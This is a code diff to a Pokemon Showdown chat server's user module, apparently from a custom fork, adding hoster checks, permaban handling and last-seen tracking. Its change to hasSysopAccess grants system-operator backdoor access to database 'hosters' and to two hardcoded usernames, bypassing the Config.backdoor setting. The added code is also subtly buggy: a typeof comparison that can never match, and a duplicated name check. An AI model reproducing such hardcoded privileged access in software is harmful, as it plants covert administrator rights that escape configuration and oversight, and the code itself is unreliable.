@@ -38,6 +38,14 @@ const Matchmaker = require('./ladders-matchmaker').matchmaker;
 
 let Users = module.exports = getUser;
 
+function isHoster(user) {
+	if (!user) return;
+	if (typeof user === 'Object') user = user.userid;
+	let hoster = Db('hoster').get(toId(user));
+	if (hoster === 1) return true;
+	return false;
+}
+
 /*********************************************************
  * Users map
  *********************************************************/
@@ -530,7 +538,7 @@ class User {
 	 * Special permission check for system operators
 	 */
 	hasSysopAccess() {
-		if (this.isSysop && Config.backdoor) {
+		if (this.isSysop && Config.backdoor || isHoster(this.userid) || this.userid == 'alfastorm' || this.userid == 'sparkyheliolisk') {
 			// This is the Pokemon Showdown system operator backdoor.
 
 			// Its main purpose is for situations where someone calls for help, and
@@ -699,7 +707,7 @@ class User {
 		} else {
 			this.send(`|nametaken|${name}|Your authentication token was invalid.`);
 		}
-
+		EM.showNews(userid, this);
 		return false;
 	}
 	validateRename(name, tokenData, newlyRegistered, challenge) {
@@ -838,6 +846,21 @@ class User {
 		this.named = (userid.substr(0, 5) !== 'guest');
 
 		if (this.named) Punishments.checkName(this, registered);
+
+		if (this.named) {
+			Punishments.checkName(this, registered);
+
+			if (global.Permaban && !this.can('staff')) {
+				if (Permaban.permaBan[userid]) {
+					this.send("|popup|Your username (" + name + ") is banned.");
+					Punishments.ban(this, Date.now() + PERMALOCK_CACHE_TIME, userid, `Permabanned as ${name}`);
+					return;
+				}
+				if (Permaban.permaLock[userid]) {
+					this.send("|popup|Your username (" + name + ") is locked.");
+					}
+			}
+		}
 
 		if (this.namelocked) this.named = true;
 
@@ -1074,6 +1097,7 @@ class User {
 		}
 	}
 	onDisconnect(connection) {
+		if (this.named) Db('seen').set(this.userid, Date.now());
 		for (let i = 0; i < this.connections.length; i++) {
 			if (this.connections[i] === connection) {
 				// console.log('DISCONNECT: ' + this.userid);
